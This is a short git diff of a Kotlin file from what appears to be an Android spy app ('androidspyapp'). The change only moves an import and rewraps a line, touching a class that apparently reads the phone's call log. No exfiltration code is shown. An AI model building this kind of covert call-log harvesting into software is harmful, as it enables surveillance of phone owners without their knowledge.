@@ -4,12 +4,13 @@ import android.annotation.SuppressLint
 import android.content.Context
 import android.database.Cursor
 import android.provider.CallLog
-import com.komnacki.androidspyapp.Message
+import com.komnacki.androidspyapp.results.Message
 import java.text.SimpleDateFormat
 import java.util.*
 
 
-class CalllogState(override var context: Context) : Message {
+class CalllogState(override var context: Context) :
+    Message {
     init {
         getCallogState(context)
     }
